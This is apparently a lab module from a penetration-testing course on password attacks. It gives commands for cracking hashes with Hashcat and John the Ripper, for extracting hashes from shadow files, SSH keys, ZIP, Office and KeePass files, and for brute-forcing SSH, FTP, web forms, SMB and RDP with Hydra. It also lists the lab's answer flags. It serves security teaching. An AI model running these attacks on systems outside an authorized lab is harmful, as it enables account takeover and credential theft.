# Password Attacks

Master password cracking techniques using Hashcat, John the Ripper, and Hydra - essential skills for penetration testing.

## Overview

Password attacks are a critical component of penetration testing. This module covers both offline (hash cracking) and online (brute force) password attacks.

```
+-----------------------------------------------------------------------------+
|                        PASSWORD ATTACK TYPES                                 |
+-----------------------------------------------------------------------------+
|                                                                              |
|   OFFLINE ATTACKS (Hash Cracking)                                            |
|   +-------------------+    +-------------------+    +-------------------+    |
|   | Dictionary Attack | -> | Rule-Based Attack | -> | Brute Force       |    |
|   | Fast, common pwds |    | Mutations/combos  |    | All combinations  |    |
|   +-------------------+    +-------------------+    +-------------------+    |
|                                                                              |
|   ONLINE ATTACKS (Live Services)                                             |
|   +-------------------+    +-------------------+    +-------------------+    |
|   | SSH Brute Force   | -> | Web Login Attack  | -> | FTP/SMB Attack    |    |
|   | Hydra, Medusa     |    | Hydra, Burp       |    | Hydra, CrackMap   |    |
|   +-------------------+    +-------------------+    +-------------------+    |
|                                                                              |
|   HASH TYPES                                                                 |
|   +-------------------+    +-------------------+    +-------------------+    |
|   | MD5, SHA1, SHA256 | -> | Unix (shadow)     | -> | Windows (NTLM)    |    |
|   | Web/App hashes    |    | $6$, $y$, crypt   |    | SAM, NTDS.dit     |    |
|   +-------------------+    +-------------------+    +-------------------+    |
|                                                                              |
+-----------------------------------------------------------------------------+
```

## Learning Objectives

By completing this section, you will be able to:

- Identify different hash types
- Use Hashcat for GPU-accelerated cracking
- Use John the Ripper for CPU-based cracking
- Perform online brute force attacks with Hydra
- Apply wordlists and rules effectively
- Extract and crack hashes from various systems

## Labs

| Lab | Topic | Difficulty | Duration |
|-----|-------|------------|----------|
| 1 | Hash Identification | Beginner | 15 min |
| 2 | Dictionary Attacks | Beginner | 30 min |
| 3 | Rule-Based Attacks | Intermediate | 45 min |
| 4 | Linux Shadow File | Intermediate | 30 min |
| 5 | Windows NTLM Hashes | Intermediate | 30 min |
| 6 | Online Brute Force | Intermediate | 45 min |

---

## Hash Identification

Before cracking, identify the hash type.

### Common Hash Formats

| Hash Type | Length | Example |
|-----------|--------|---------|
| MD5 | 32 | `5d41402abc4b2a76b9719d911017c592` |
| SHA1 | 40 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| SHA256 | 64 | `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c...` |
| NTLM | 32 | `32ed87bdb5fdc5e9cba88547376818d4` |
| bcrypt | 60 | `$2a$10$...` |
| SHA512crypt | varies | `$6$rounds=5000$salt$hash` |

### Identification Tools

```bash
# hashid
hashid 'HASH_HERE'
hashid -m 'HASH_HERE'  # Show Hashcat mode

# hash-identifier
hash-identifier

# Online: https://hashes.com/en/tools/hash_identifier
```

### Linux Shadow File Format

```
username:$TYPE$SALT$HASH:last_change:min:max:warn:inactive:expire
```

Type identifiers:
- `$1$` - MD5
- `$5$` - SHA256
- `$6$` - SHA512
- `$y$` - yescrypt (modern)

---

## Hashcat

Hashcat is the fastest password cracker, leveraging GPU acceleration.

### Installation

```bash
# Kali Linux
apt install hashcat

# Verify GPU
hashcat -I

# Benchmark
hashcat -b
```

### Basic Usage

```bash
# Syntax
hashcat -m MODE -a ATTACK_TYPE HASH_FILE WORDLIST

# Common modes (-m)
# 0     = MD5
# 100   = SHA1
# 1400  = SHA256
# 1000  = NTLM
# 1800  = SHA512crypt (Linux)
# 3200  = bcrypt
# 500   = MD5crypt (Linux old)

# Attack types (-a)
# 0 = Dictionary
# 1 = Combination
# 3 = Brute force (mask)
# 6 = Dictionary + mask
# 7 = Mask + dictionary
```

### Dictionary Attack

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With performance options
hashcat -m 0 -a 0 -O -w 3 hashes.txt rockyou.txt

# -O = Optimized kernels
# -w 3 = Workload high (use with caution)
```

### Rule-Based Attack

```bash
# Use built-in rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common rule files:
# best64.rule      - Good balance
# rockyou-30000.rule - Aggressive
# d3ad0ne.rule     - Large rule set
# dive.rule        - Comprehensive

# Stack multiple rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rule1.rule -r rule2.rule
```

### Mask Attack (Brute Force)

```bash
# Mask characters:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digits (0-9)
# ?s = special (!@#$%...)
# ?a = all printable

# 8 character lowercase
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Word + 4 digits
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d

# Custom charset
hashcat -m 0 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1
```

### Hashcat Examples

```bash
# Crack MD5 with dictionary
hashcat -m 0 -a 0 md5.txt rockyou.txt

# Crack NTLM with rules
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule

# Crack SHA512crypt (Linux /etc/shadow)
hashcat -m 1800 -a 0 shadow.txt rockyou.txt

# Show cracked passwords
hashcat -m 0 --show hashes.txt
```

---

## John the Ripper

John is a versatile CPU-based cracker with excellent format detection.

### Basic Usage

```bash
# Auto-detect format
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt

# Use wordlist
john --wordlist=rockyou.txt hashes.txt

# Show cracked
john --show hashes.txt
```

### Common Formats

```bash
# List all formats
john --list=formats

# Common formats:
# raw-md5, raw-sha1, raw-sha256
# nt (NTLM)
# sha512crypt (Linux $6$)
# bcrypt
```

### Hash Extraction Tools

```bash
# Extract from /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# Extract from SSH private key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt

# Extract from ZIP file
zip2john protected.zip > zip_hash.txt
john zip_hash.txt

# Extract from Office documents
office2john document.docx > office_hash.txt
john office_hash.txt

# Extract from KeePass
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt
```

### Rules in John

```bash
# Use rules
john --wordlist=rockyou.txt --rules hashes.txt

# Specific rule set
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt

# Single crack mode (uses username info)
john --single hashes.txt
```

---

## Hydra

Hydra performs online brute force attacks against live services.

### Basic Syntax

```bash
hydra -l USER -P WORDLIST TARGET PROTOCOL

# Options:
# -l USER      Single username
# -L FILE      Username list
# -p PASS      Single password
# -P FILE      Password list
# -t THREADS   Parallel connections (default 16)
# -f           Exit on first valid
# -V           Verbose
```

### SSH Brute Force

```bash
# Single user, password list
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# User list, password list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Specific port
hydra -l admin -P rockyou.txt ssh://192.168.1.100 -s 2222

# CyberLab vulnerable SSH
hydra -l labuser -P /usr/share/wordlists/rockyou.txt ssh://localhost -s 2222
```

### FTP Brute Force

```bash
# FTP attack
hydra -l anonymous -P passwords.txt ftp://192.168.1.100

# CyberLab vulnerable FTP
hydra -l anonymous -P passwords.txt ftp://localhost -s 2121
```

### HTTP Form Brute Force

```bash
# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# DVWA login example
hydra -l admin -P rockyou.txt localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -s 8081
```

### Other Protocols

```bash
# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# SMB
hydra -l administrator -P passwords.txt smb://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100
```

---

## Wordlists

### Common Locations (Kali)

```bash
/usr/share/wordlists/rockyou.txt          # Most popular
/usr/share/wordlists/dirb/common.txt      # Web directories
/usr/share/wordlists/dirbuster/           # Larger web lists
/usr/share/seclists/                      # Comprehensive collection
```

### SecLists Password Lists

```bash
# Install SecLists
apt install seclists

# Location
/usr/share/seclists/Passwords/

# Good password lists:
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
```

### Creating Custom Wordlists

```bash
# CeWL - Generate from website
cewl -w wordlist.txt -d 2 -m 5 https://target.com

# Crunch - Generate patterns
crunch 8 8 -t @@@@%%%% -o wordlist.txt  # 4 letters + 4 numbers

# Username generator
# Combine first/last names
```

---

## Practice with CyberLab

### Exercise 1: Crack MD5 Hashes

```bash
# Create test hashes
echo -n "password123" | md5sum | cut -d' ' -f1 > md5.txt
echo -n "letmein" | md5sum | cut -d' ' -f1 >> md5.txt
echo -n "admin" | md5sum | cut -d' ' -f1 >> md5.txt

# Crack with hashcat
hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt

# Show results
hashcat -m 0 --show md5.txt
```

### Exercise 2: Crack Linux Shadow Hashes

```bash
# Get shadow file from container
docker exec lab-buffer-overflow cat /etc/shadow > shadow.txt

# Extract just the hash
grep labuser shadow.txt

# Crack with John
john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john --show shadow.txt
```

### Exercise 3: SSH Brute Force

```bash
# Create small password list for testing
echo "password" > test_passwords.txt
echo "admin" >> test_passwords.txt
echo "labpass123" >> test_passwords.txt

# Attack vulnerable SSH
hydra -l labuser -P test_passwords.txt ssh://localhost -s 2222 -t 4

# Expected: Finds labpass123
```

### Exercise 4: Web Login Attack

```bash
# Attack DVWA login
# First, login and set security to low

# Then brute force:
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -s 8081 -t 10
```

---

## Flags

| Lab | Flag |
|-----|------|
| Hash Cracking | FLAG{h4sh_cr4ck3d} |
| SSH Brute Force | FLAG{ssh_brut3_f0rc3d} |
| Web Login Attack | FLAG{w3b_l0g1n_pwn3d} |

---

## Best Practices

### Efficiency Tips

1. **Start with common passwords** - rockyou.txt first
2. **Use rules** - Multiply effectiveness
3. **Target known patterns** - Company name + year
4. **GPU > CPU** - Use hashcat when possible
5. **Optimize wordlists** - Remove duplicates, sort by frequency

### Attack Strategy

```
1. Dictionary attack with rockyou.txt
2. Dictionary + rules (best64.rule)
3. Common patterns (Word + numbers)
4. Targeted wordlist (company-specific)
5. Mask attack (known password policy)
6. Full brute force (last resort)
```

### Rate Limiting Awareness

Online attacks may trigger:
- Account lockouts
- IP bans
- Alerts

```bash
# Reduce speed with hydra
hydra -t 1 -W 3 ...  # 1 thread, 3 second wait
```

---

## Quick Reference

### Hashcat Modes

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1400 | SHA256 |
| 1800 | SHA512crypt |
| 3200 | bcrypt |
| 500 | MD5crypt |
| 13100 | Kerberos TGS |

### John Formats

| Format | Description |
|--------|-------------|
| raw-md5 | Plain MD5 |
| raw-sha1 | Plain SHA1 |
| nt | Windows NTLM |
| sha512crypt | Linux $6$ |
| bcrypt | Blowfish |

### Hydra Protocols

| Protocol | Service |
|----------|---------|
| ssh | SSH |
| ftp | FTP |
| http-post-form | Web forms |
| mysql | MySQL |
| smb | Windows shares |
| rdp | Remote Desktop |

---

## Resources

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [John the Ripper Docs](https://www.openwall.com/john/doc/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [CrackStation](https://crackstation.net/) - Online hash lookup
- [Hashes.com](https://hashes.com/) - Hash identifier

---

**Previous:** [04 - Buffer Overflow](../04-buffer-overflow/) | **Next:** [06 - Post-Exploitation](../06-post-exploitation/)
